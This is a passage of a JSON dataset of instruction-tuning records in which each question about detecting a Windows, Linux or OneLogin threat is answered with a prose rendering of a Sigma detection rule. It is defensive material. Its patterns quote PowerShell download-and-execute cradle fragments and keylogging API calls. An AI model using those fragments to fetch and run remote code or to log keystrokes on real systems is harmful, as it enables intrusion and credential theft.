tactics and techniques that exploit specific Windows features for malicious purposes, underscoring the importance of vigilance in registry event logging as a means to safeguard against sophisticated attacks on Windows 10 systems."
    }
  },
  {
    "instruction": "How can I detect: potential persistence behaviour using the windows telemetry registry key.\nWindows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections.\nThis binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run.\nThe problem is, it will run any arbitrary command without restriction of location or type.\n",
    "context": "",
    "output": "In order to detect potential persistence behavior using the Windows telemetry registry key, you should: Monitor the registry for changes that are indicative of manipulation attempts targeting the Windows telemetry feature. Specifically, look for modifications to the registry subkey `\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\` using the Sysmon tool configured to observe the HKLM hives. Detect when values are set (EventType: SetValue) for commands (`\\Command`) under this subkey, especially if the modifications involve files with extensions like '.sh', '.exe', '.dll', '.bin', '.bat', '.cmd', '.js', '.ps', '.vb', '.jar', '.hta', '.msi', or '.vbs'. It is important to exclude legitimate telemetry-related processes such as '\\system32\\CompatTelRunner.exe' and '\\system32\\DeviceCensus.exe' from triggering alerts, to avoid false positives. The high alert level indicates the significance of this behavior, as it could allow attackers to establish persistence by instructing the telemetry binary to execute arbitrary and potentially malicious commands. Monitoring for such changes can aid in identifying unauthorized persistence mechanisms leveraging Windows telemetry infrastructure.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential persistence behaviour using the windows telemetry registry key.\nWindows telemetry makes use of the binary CompatTelRunner.exe to run a variety of commands and perform the actual telemetry collections.\nThis binary was created to be easily extensible, and to that end, it relies on the registry to instruct on which commands to run.\nThe problem is, it will run any arbitrary command without restriction of location or type.\n",
      "answer": "In order to detect potential persistence behavior using the Windows telemetry registry key, you should: Monitor the registry for changes that are indicative of manipulation attempts targeting the Windows telemetry feature. Specifically, look for modifications to the registry subkey `\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\` using the Sysmon tool configured to observe the HKLM hives. Detect when values are set (EventType: SetValue) for commands (`\\Command`) under this subkey, especially if the modifications involve files with extensions like '.sh', '.exe', '.dll', '.bin', '.bat', '.cmd', '.js', '.ps', '.vb', '.jar', '.hta', '.msi', or '.vbs'. It is important to exclude legitimate telemetry-related processes such as '\\system32\\CompatTelRunner.exe' and '\\system32\\DeviceCensus.exe' from triggering alerts, to avoid false positives. The high alert level indicates the significance of this behavior, as it could allow attackers to establish persistence by instructing the telemetry binary to execute arbitrary and potentially malicious commands. Monitoring for such changes can aid in identifying unauthorized persistence mechanisms leveraging Windows telemetry infrastructure."
    }
  },
  {
    "instruction": "Can you explain how to detect: SILENTTRINITY stager use via PE metadata",
    "context": "",
    "output": "Certainly!\n\nIn order to detect SILENTTRINITY stager use via PE metadata, you should: Monitor the creation of processes on Windows operating systems. Specifically, look for occurrences where the process creation logs include a description that contains the term 'st2stager'. This term is indicative of the SILENTTRINITY stager's use, which is a tool that can be employed by attackers to gain remote access and execute commands on a compromised system. Since the likelihood of encountering this term within a legitimate process's description is low, instances flagged by this criterion are considered to have a high level of threat. By focusing on this detection method, you leverage one of the critical indicators to identify the utilization of SILENTTRINITY stager in the environment effectively.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "SILENTTRINITY stager use via PE metadata",
      "answer": "In order to detect SILENTTRINITY stager use via PE metadata, you should: Monitor the creation of processes on Windows operating systems. Specifically, look for occurrences where the process creation logs include a description that contains the term 'st2stager'. This term is indicative of the SILENTTRINITY stager's use, which is a tool that can be employed by attackers to gain remote access and execute commands on a compromised system. Since the likelihood of encountering this term within a legitimate process's description is low, instances flagged by this criterion are considered to have a high level of threat. By focusing on this detection method, you leverage one of the critical indicators to identify the utilization of SILENTTRINITY stager in the environment effectively."
    }
  },
  {
    "instruction": "Please help me detect the following: scheduled task creations or modification on a suspicious schedule type",
    "context": "",
    "output": "Sure!\nIn order to detect scheduled task creations or modification on a suspicious schedule type, you should monitor for the creation or alteration of scheduled tasks in Windows environments specifically by tracking process creation logs. Look for the use of `schtasks.exe` either by its process image ending with `\\schtasks.exe` or having an original file name of `schtasks.exe`. Further scrutinize any command-line invocation of `schtasks.exe` that includes scheduling parameters such as `ONLOGON`, `ONSTART`, `ONCE`, or `ONIDLE` to pinpoint tasks set to trigger on logon, system start, one-time executions, or when the system is idle, respectively. However, it's crucial to filter out command lines that include \"NT AUT\", \" SYSTEM\", or \"HIGHEST\" to avoid false positives related to tasks run under common system authority or with highest privileges, as these might be legitimate system processes. This detection method is ranked with a high level of importance due to the potential misuse of scheduled tasks for malicious purposes, such as maintaining persistence or executing malware at specific triggers. Be aware of legitimate scheduled tasks that may fit these criteria and adjust the filtering according to your specific environment to minimize false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "scheduled task creations or modification on a suspicious schedule type",
      "answer": "In order to detect scheduled task creations or modification on a suspicious schedule type, you should monitor for the creation or alteration of scheduled tasks in Windows environments specifically by tracking process creation logs. Look for the use of `schtasks.exe` either by its process image ending with `\\schtasks.exe` or having an original file name of `schtasks.exe`. Further scrutinize any command-line invocation of `schtasks.exe` that includes scheduling parameters such as `ONLOGON`, `ONSTART`, `ONCE`, or `ONIDLE` to pinpoint tasks set to trigger on logon, system start, one-time executions, or when the system is idle, respectively. However, it's crucial to filter out command lines that include \"NT AUT\", \" SYSTEM\", or \"HIGHEST\" to avoid false positives related to tasks run under common system authority or with highest privileges, as these might be legitimate system processes. This detection method is ranked with a high level of importance due to the potential misuse of scheduled tasks for malicious purposes, such as maintaining persistence or executing malware at specific triggers. Be aware of legitimate scheduled tasks that may fit these criteria and adjust the filtering according to your specific environment to minimize false positives."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of the \"Get-AdComputer\" to enumerate Computers or properties within Active Directory.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect usage of the \"Get-AdComputer\" to enumerate Computers or properties within Active Directory, you should monitor PowerShell script executions on Windows systems. Focus on identifying instances where the script text contains the 'Get-AdComputer ' cmdlet, which is typically used for querying Active Directory for computer objects or their properties. Look specifically for script executions that include commands like '-Filter ', '-LDAPFilter ', and '-Properties ', as these are often used to refine queries and could indicate an attempt to enumerate or extract detailed information from Active Directory. Ensure that Script Block Logging is enabled to capture the necessary details for analysis. Note that while this detection is important, it has a low level of confidence and may result in unknown false positives, suggesting a need for manual verification of the context in which these commands are used.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"Get-AdComputer\" to enumerate Computers or properties within Active Directory.",
      "answer": "In order to detect usage of the \"Get-AdComputer\" to enumerate Computers or properties within Active Directory, you should monitor PowerShell script executions on Windows systems. Focus on identifying instances where the script text contains the 'Get-AdComputer ' cmdlet, which is typically used for querying Active Directory for computer objects or their properties. Look specifically for script executions that include commands like '-Filter ', '-LDAPFilter ', and '-Properties ', as these are often used to refine queries and could indicate an attempt to enumerate or extract detailed information from Active Directory. Ensure that Script Block Logging is enabled to capture the necessary details for analysis. Note that while this detection is important, it has a low level of confidence and may result in unknown false positives, suggesting a need for manual verification of the context in which these commands are used."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.",
    "context": "",
    "output": "In order to detect the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\certutil.exe' or has an original file name of 'CertUtil.exe'. Additionally, inspect the command line for the presence of '-exportPFX ' or '/exportPFX ' flags. This combination of process name and command line flags indicates an attempt to export certificates using certutil, which could be legitimate but also a technique used in cyber attacks. It is important to investigate these instances to determine their nature.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates.",
      "answer": "In order to detect the execution of the certutil with the \"exportPFX\" flag which allows the utility to export certificates, you should: Monitor Windows process creation logs for instances where the process image name ends with '\\certutil.exe' or has an original file name of 'CertUtil.exe'. Additionally, inspect the command line for the presence of '-exportPFX ' or '/exportPFX ' flags. This combination of process name and command line flags indicates an attempt to export certificates using certutil, which could be legitimate but also a technique used in cyber attacks. It is important to investigate these instances to determine their nature."
    }
  },
  {
    "instruction": "Please help me detect the following: Adversaries may log user keystrokes to intercept credentials as the user types them.",
    "context": "",
    "output": "Sure!\nIn order to detect adversaries logging user keystrokes to intercept credentials as the user types them, you should focus on monitoring PowerShell script activities within the Windows environment, particularly paying attention to Script Block Logging. Specifically, look for scripts that contain the text 'Get-Keystrokes'. This indication could suggest an attempt to capture keystrokes, which is a common technique used by malicious actors to harvest sensitive information such as credentials. Furthermore, advanced detection should consider scripts attempting to operate in the background and directly interact with the keyboard by looking for the inclusion of both 'Get-ProcAddress user32.dll GetAsyncKeyState' and 'Get-ProcAddress user32.dll GetForegroundWindow' within the same script block. These commands are indicative of a more sophisticated attempt to monitor keystroke entries without alerting the user. This monitoring strategy is vital because it targets the specifics of how credential theft via keystroke logging might be implemented by an attacker using PowerShell, a powerful and commonly exploited tool in Windows environments.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may log user keystrokes to intercept credentials as the user types them.",
      "answer": "In order to detect adversaries logging user keystrokes to intercept credentials as the user types them, you should focus on monitoring PowerShell script activities within the Windows environment, particularly paying attention to Script Block Logging. Specifically, look for scripts that contain the text 'Get-Keystrokes'. This indication could suggest an attempt to capture keystrokes, which is a common technique used by malicious actors to harvest sensitive information such as credentials. Furthermore, advanced detection should consider scripts attempting to operate in the background and directly interact with the keyboard by looking for the inclusion of both 'Get-ProcAddress user32.dll GetAsyncKeyState' and 'Get-ProcAddress user32.dll GetForegroundWindow' within the same script block. These commands are indicative of a more sophisticated attempt to monitor keystroke entries without alerting the user. This monitoring strategy is vital because it targets the specifics of how credential theft via keystroke logging might be implemented by an attacker using PowerShell, a powerful and commonly exploited tool in Windows environments."
    }
  },
  {
    "instruction": "Please help me detect the following: This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious activity and tampering with accounts that have been disabled or somehow restricted, you should monitor Windows security service logs for specific failed logon events and their associated error codes. Focus on the detection of events with ID 4625 and 4776, which indicate a failed logon attempt. The key to identifying potentially malicious behavior lies in paying attention to the following error codes: \n\n- '0xC0000072' indicating a user attempted to logon to an account that has been disabled by an administrator.\n- '0xC000006F' signifying a user tried logging on outside of the authorized hours.\n- '0xC0000070' suggesting a logon attempt from an unauthorized workstation.\n- '0xC0000413' indicating a logon failure due to the machine being protected by an authentication firewall, and the specified account is not allowed to authenticate to the machine.\n- '0xC000018C' showing the logon request failed because the trust relationship between the primary domain and the trusted domain failed.\n- '0xC000015B' demonstrating the user has not been granted the requested logon type at the machine.\n\nAdditionally, it's important to filter out any events where the 'SubjectUserSid' is 'S-1-0-0', as this might reduce the number of false positives, such as legitimate user activities using a disabled account. Keep an eye out for these specific error codes in your security logs because they serve as strong indicators of attempted unauthorized access, potentially revealing malicious intent or insider threats attempting to bypass security measures. This practice is aligned with various MITRE ATT&CK techniques focusing on Credential Access and Initial Access strategies, helping to detect and mitigate attempts at exploiting user accounts and logon procedures.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.",
      "answer": "In order to detect suspicious activity and tampering with accounts that have been disabled or somehow restricted, you should monitor Windows security service logs for specific failed logon events and their associated error codes. Focus on the detection of events with ID 4625 and 4776, which indicate a failed logon attempt. The key to identifying potentially malicious behavior lies in paying attention to the following error codes: \n\n- '0xC0000072' indicating a user attempted to logon to an account that has been disabled by an administrator.\n- '0xC000006F' signifying a user tried logging on outside of the authorized hours.\n- '0xC0000070' suggesting a logon attempt from an unauthorized workstation.\n- '0xC0000413' indicating a logon failure due to the machine being protected by an authentication firewall, and the specified account is not allowed to authenticate to the machine.\n- '0xC000018C' showing the logon request failed because the trust relationship between the primary domain and the trusted domain failed.\n- '0xC000015B' demonstrating the user has not been granted the requested logon type at the machine.\n\nAdditionally, it's important to filter out any events where the 'SubjectUserSid' is 'S-1-0-0', as this might reduce the number of false positives, such as legitimate user activities using a disabled account. Keep an eye out for these specific error codes in your security logs because they serve as strong indicators of attempted unauthorized access, potentially revealing malicious intent or insider threats attempting to bypass security measures. This practice is aligned with various MITRE ATT&CK techniques focusing on Credential Access and Initial Access strategies, helping to detect and mitigate attempts at exploiting user accounts and logon procedures."
    }
  },
  {
    "instruction": "How to detect: suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
    "context": "",
    "output": "In order to detect suspicious PowerShell download patterns that are often used in malicious scripts, stagers, or downloaders (make sure that your backend applies the strings case-insensitive), you should monitor for process creation events on Windows systems. Specifically, look for the use of PowerShell command lines that include patterns indicative of attempts to download and execute remote content. These patterns include various forms of the `Invoke-Expression (IEX)` command combined with `New-Object Net.WebClient` or `System.Net.WebClient` to download strings or files from the internet. Examples of these patterns are command lines containing 'IEX ((New-Object Net.WebClient).DownloadString', 'IEX (New-Object Net.WebClient).DownloadString', 'IEX((New-Object Net.WebClient).DownloadString', 'IEX(New-Object Net.WebClient).DownloadString', ' -command (New-Object System.Net.WebClient).DownloadFile(', or ' -c (New-Object System.Net.WebClient).DownloadFile('. It's important to approach this detection with caution due to the possibility of false positives, such as legitimate software installers that may utilize similar methods to pull packages from remote systems and execute them. The security level for these detections is considered high, underscoring the importance of monitoring for these patterns to identify potential malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
      "answer": "In order to detect suspicious PowerShell download patterns that are often used in malicious scripts, stagers, or downloaders (make sure that your backend applies the strings case-insensitive), you should monitor for process creation events on Windows systems. Specifically, look for the use of PowerShell command lines that include patterns indicative of attempts to download and execute remote content. These patterns include various forms of the `Invoke-Expression (IEX)` command combined with `New-Object Net.WebClient` or `System.Net.WebClient` to download strings or files from the internet. Examples of these patterns are command lines containing 'IEX ((New-Object Net.WebClient).DownloadString', 'IEX (New-Object Net.WebClient).DownloadString', 'IEX((New-Object Net.WebClient).DownloadString', 'IEX(New-Object Net.WebClient).DownloadString', ' -command (New-Object System.Net.WebClient).DownloadFile(', or ' -c (New-Object System.Net.WebClient).DownloadFile('. It's important to approach this detection with caution due to the possibility of false positives, such as legitimate software installers that may utilize similar methods to pull packages from remote systems and execute them. The security level for these detections is considered high, underscoring the importance of monitoring for these patterns to identify potential malicious activities."
    }
  },
  {
    "instruction": "Can you explain how to detect: anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.",
      "answer": "In order to detect anyone attempting a backup for the DPAPI Master Key, which is an event generated at the source and not the Domain Controller, you should monitor security logs from Windows systems for the event ID 4692. This specific event ID is triggered when there's an attempt to backup the Data Protection API (DPAPI) Master Key. Pay particular attention to fields such as ComputerName, SubjectDomainName, and SubjectUserName within these logs to help identify the source and context of the attempt. It's worth noting that false positives may occur if a computer is part of a domain because DPAPI employs a backup mechanism to allow unprotection of the data, which can trigger this event. The risk level associated with this detection is considered medium."
    }
  },
  {
    "instruction": "How can I detect: when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
    "context": "",
    "output": "In order to detect when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities, you should monitor for instances where the Windows Task Scheduler command-line tool (schtasks.exe) is used to modify scheduled tasks with the specific intent to disable them. Particularly, look for command-line invocations that include both the '/Change' and '/TN' arguments together with the '/disable' argument. This indicates an attempt to change a task's properties in order to disable it. Additional scrutiny should be applied when the command lines also contain references to critical system tasks related to Windows System Restore, Windows Defender, BitLocker, Windows Backup, Windows Update, Update Orchestrator, and Exploit Guard. These tasks are vital for system recovery, security, and maintenance. Any command that seeks to disable these tasks could be indicative of a malicious attempt to undermine the system's defenses or its ability to recover from adverse changes, thereby facilitating data destructive activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities",
      "answer": "In order to detect when adversaries stop services or processes by disabling their respective scheduled tasks in order to conduct data destructive activities, you should monitor for instances where the Windows Task Scheduler command-line tool (schtasks.exe) is used to modify scheduled tasks with the specific intent to disable them. Particularly, look for command-line invocations that include both the '/Change' and '/TN' arguments together with the '/disable' argument. This indicates an attempt to change a task's properties in order to disable it. Additional scrutiny should be applied when the command lines also contain references to critical system tasks related to Windows System Restore, Windows Defender, BitLocker, Windows Backup, Windows Update, Update Orchestrator, and Exploit Guard. These tasks are vital for system recovery, security, and maintenance. Any command that seeks to disable these tasks could be indicative of a malicious attempt to undermine the system's defenses or its ability to recover from adverse changes, thereby facilitating data destructive activities."
    }
  },
  {
    "instruction": "Explain how should I detect the following: possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server's Unified Messaging service",
    "context": "",
    "output": "In order to detect possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for abnormal subprocesses spawning by Exchange Server's Unified Messaging service, you should: Focus on monitoring the process creation events within a Windows environment, particularly those initiated by the Unified Messaging service's worker process, identified as 'UMWorkerProcess.exe'. It's crucial to investigate any subprocess that gets spawned by this parent process to identify potentially malicious activity. However, it's important to exclude processes that are expected and benign, specifically if they end with 'wermgr.exe' or 'WerFault.exe', as these are typically involved in error reporting and are not indicative of the exploitation attempt in question. The detection strategy employs a high level of accuracy to minimize false positives, yet any occurrence outside of the filtered parameters should warrant further investigation due to the serious implications of exploiting CVE-2021-26857.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Server's Unified Messaging service",
      "answer": "In order to detect possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for abnormal subprocesses spawning by Exchange Server's Unified Messaging service, you should: Focus on monitoring the process creation events within a Windows environment, particularly those initiated by the Unified Messaging service's worker process, identified as 'UMWorkerProcess.exe'. It's crucial to investigate any subprocess that gets spawned by this parent process to identify potentially malicious activity. However, it's important to exclude processes that are expected and benign, specifically if they end with 'wermgr.exe' or 'WerFault.exe', as these are typically involved in error reporting and are not indicative of the exploitation attempt in question. The detection strategy employs a high level of accuracy to minimize false positives, yet any occurrence outside of the filtered parameters should warrant further investigation due to the serious implications of exploiting CVE-2021-26857."
    }
  },
  {
    "instruction": "How to detect: suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.",
    "context": "",
    "output": "In order to detect suspicious powershell processes which include bxor command, alternative obfuscation method to b64 encoded commands, you should: Monitor Windows PowerShell classic event logs for activities. Particularly, watch out for instances where the host name matches 'ConsoleHost'. Among these, focus on filtering events where the host application's command contains specific keywords such as 'bxor', 'join', or 'char'. These keywords are indicative of possible obfuscation techniques being used, with 'bxor' being of special interest as it signifies a method of obfuscation different from the commonly known base64 encoding methods. This approach aims at identifying and analyzing suspicious PowerShell activities that could be attempting to evade detection through the use of sophisticated obfuscation. The detection level for this kind of activity is considered medium, acknowledging there might be unknown scenarios leading to false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious powershell process which includes bxor command, alternative obfuscation method to b64 encoded commands.",
      "answer": "In order to detect suspicious powershell processes which include bxor command, alternative obfuscation method to b64 encoded commands, you should: Monitor Windows PowerShell classic event logs for activities. Particularly, watch out for instances where the host name matches 'ConsoleHost'. Among these, focus on filtering events where the host application's command contains specific keywords such as 'bxor', 'join', or 'char'. These keywords are indicative of possible obfuscation techniques being used, with 'bxor' being of special interest as it signifies a method of obfuscation different from the commonly known base64 encoding methods. This approach aims at identifying and analyzing suspicious PowerShell activities that could be attempting to evade detection through the use of sophisticated obfuscation. The detection level for this kind of activity is considered medium, acknowledging there might be unknown scenarios leading to false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension",
    "context": "",
    "output": "In order to detect Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension, you should: monitor process creation events on Windows systems specifically for occurrences where the processes named `wscript.exe` or `cscript.exe` are initiated. These processes are Windows Script Host utilities used to execute scripts on the Windows operating system. Their execution becomes suspicious when they attempt to run files with extensions that are typically associated with non-executable, and often data-only, file types such as `.csv`, `.dat`, `.doc`, `.gif`, `.jpeg`, `.jpg`, `.png`, `.ppt`, `.txt`, `.xls`, and `.xml`. This behavior could indicate an attempt to bypass security controls by executing malicious code hidden within files that appear benign. Detecting this can be pivotal in identifying and countering scripts that exploit these utilities for malicious purposes like malware infection, data exfiltration, or other threats. The detection requires checking both the original file name and the path ending for the processes `wscript.exe` and `cscript.exe`, in conjunction with observing the command line for the inclusion of the specified unconventional file extensions. It's important to be vigilant for such activities, although one must also consider that in some rare and less clear scenarios, legitimate scripts may perform unusual actions, leading to potential false positives. The risk level associated with this detection is deemed high due to the unconventional use of script host utilities that could signify malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension",
      "answer": "In order to detect Wscript/Cscript executing a file with an uncommon (i.e. non-script) extension, you should: monitor process creation events on Windows systems specifically for occurrences where the processes named `wscript.exe` or `cscript.exe` are initiated. These processes are Windows Script Host utilities used to execute scripts on the Windows operating system. Their execution becomes suspicious when they attempt to run files with extensions that are typically associated with non-executable, and often data-only, file types such as `.csv`, `.dat`, `.doc`, `.gif`, `.jpeg`, `.jpg`, `.png`, `.ppt`, `.txt`, `.xls`, and `.xml`. This behavior could indicate an attempt to bypass security controls by executing malicious code hidden within files that appear benign. Detecting this can be pivotal in identifying and countering scripts that exploit these utilities for malicious purposes like malware infection, data exfiltration, or other threats. The detection requires checking both the original file name and the path ending for the processes `wscript.exe` and `cscript.exe`, in conjunction with observing the command line for the inclusion of the specified unconventional file extensions. It's important to be vigilant for such activities, although one must also consider that in some rare and less clear scenarios, legitimate scripts may perform unusual actions, leading to potential false positives. The risk level associated with this detection is deemed high due to the unconventional use of script host utilities that could signify malicious intent."
    }
  },
  {
    "instruction": "Explain how should I detect the following: when an user account is locked or suspended.",
    "context": "",
    "output": "In order to detect when a user account is locked or suspended, you should: Monitor Onelogin event logs for specific event types that indicate such activities have occurred. Focus on Onelogin's events log source, where you'll primarily be looking for three types of events. First, look for events with an event type ID of 532, which signals that an account has been locked via API. Secondly, watch out for events marked with an event type ID of 553, indicating an account was also locked through API interactions. Thirdly, be aware of events with an event type ID of 551, which points towards an account suspension carried out via API.\n\nThese activities might sometimes generate false positives, as the system may legitimately lock or suspend user accounts for various non-malicious reasons. Therefore, the level of threat associated with these detections is considered low. Focus your efforts on examining these specific event IDs in the Onelogin's events logs to effectively identify cases where a user account might be at risk, aligning with associated detection practices linked to account manipulation and abuse of authentication processes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an user account is locked or suspended.",
      "answer": "In order to detect when a user account is locked or suspended, you should: Monitor Onelogin event logs for specific event types that indicate such activities have occurred. Focus on Onelogin's events log source, where you'll primarily be looking for three types of events. First, look for events with an event type ID of 532, which signals that an account has been locked via API. Secondly, watch out for events marked with an event type ID of 553, indicating an account was also locked through API interactions. Thirdly, be aware of events with an event type ID of 551, which points towards an account suspension carried out via API.\n\nThese activities might sometimes generate false positives, as the system may legitimately lock or suspend user accounts for various non-malicious reasons. Therefore, the level of threat associated with these detections is considered low. Focus your efforts on examining these specific event IDs in the Onelogin's events logs to effectively identify cases where a user account might be at risk, aligning with associated detection practices linked to account manipulation and abuse of authentication processes."
    }
  },
  {
    "instruction": "How can I detect: usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process.",
    "context": "",
    "output": "In order to detect usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process, you should: Monitor process creation logs on Linux systems for the execution of commands that include \"kill\", \"pkill\", or \"killall\" at the end of the command path. Be aware that there may be legitimate uses of these commands, so the likelihood of false positives is high and the detection level is considered low.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process.",
      "answer": "In order to detect usage of command line tools such as \"kill\", \"pkill\" or \"killall\" to terminate or signal a running process, you should: Monitor process creation logs on Linux systems for the execution of commands that include \"kill\", \"pkill\", or \"killall\" at the end of the command path. Be aware that there may be legitimate uses of these commands, so the likelihood of false positives is high and the detection level is considered low."
    }
  },
  {
    "instruction": "Can you explain how to detect: chmod targeting files in abnormal directory paths.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect chmod targeting files in abnormal directory paths, you should: Monitor process creation logs within Linux environments for instances where the chmod command is executed. Specifically, pay attention to commands ending with '/chmod' accompanied by command lines that include references to unusual directory paths such as '/tmp/', '/.Library/', '/etc/', and '/opt/'. This detection effort focuses on capturing potentially malicious activity where chmod might be used to alter file permissions in directories that are not commonly targeted for legitimate permission changes. It's important to consider legitimate administrative activities that involve changing file permissions as potential false positives. This monitoring is categorized with a medium severity level and is essential for identifying unauthorized or suspicious changes in file permissions, which could be indicative of a malicious actor attempting to modify system configurations or gain access to sensitive areas of the system.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "chmod targeting files in abnormal directory paths.",
      "answer": "In order to detect chmod targeting files in abnormal directory paths, you should: Monitor process creation logs within Linux environments for instances where the chmod command is executed. Specifically, pay attention to commands ending with '/chmod' accompanied by command lines that include references to unusual directory paths such as '/tmp/', '/.Library/', '/etc/', and '/opt/'. This detection effort focuses on capturing potentially malicious activity where chmod might be used to alter file permissions in directories that are not commonly targeted for legitimate permission changes. It's important to consider legitimate administrative activities that involve changing file permissions as potential false positives. This monitoring is categorized with a medium severity level and is essential for identifying unauthorized or suspicious changes in file permissions, which could be indicative of a malicious actor attempting to modify system configurations or gain access to sensitive areas of the system."
    }
  },
  {
    "instruction": "Please help me detect the following: execution of DeviceCredentialDeployment to hide a process from view",
    "context": "",
    "output": "Sure!\nIn order to detect the execution of DeviceCredentialDeployment to hide a process from view, you should: Monitor Windows process creation events for any instance where the process image name ends with '\\DeviceCredentialDeployment.exe'. This particular executable is critical to observe as its execution could indicate attempts to obscure a process from visibility, a tactic often employed in malicious operations. It is fairly uncommon for this process to be triggered in a benign context, hence alerts generated from this detection should be treated with medium priority for investigation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of DeviceCredentialDeployment to hide a process from view",
      "answer": "In order to detect the execution of DeviceCredentialDeployment to hide a process from view, you should: Monitor Windows process creation events for any instance where the process image name ends with '\\DeviceCredentialDeployment.exe'. This particular executable is critical to observe as its execution could indicate attempts to obscure a process from visibility, a tactic often employed in malicious operations. It is fairly uncommon for this process to be triggered in a benign context, hence alerts generated from this detection should be treated with medium priority for investigation."
    }
  },
  {
    "instruction": "Please help me detect the following: An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
    "context": "",
    "output": "Sure!\nIn order to detect an adversary leveraging legitimate desktop support and remote access software to establish an interactive command and control channel to target systems within networks, you should: Monitor for the creation of processes on Windows systems that are indicative of the GoTo Opener software. This involves looking for any process that has a description of \"GoTo Opener,\" is named \"GoTo Opener,\" and is associated with the company \"LogMeIn, Inc.\" It's important to note, however, that there may be legitimate uses of this software, so not all detections signify malicious activity but should be examined within the context of other suspicious activities on the network. The monitoring of such processes falls under the tactics of Execution, Persistence, and Privilege Escalation, as malicious actors may use the GoTo Opener as a method to execute commands, maintain persistent access, and potentially escalate their privileges within a target network.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n",
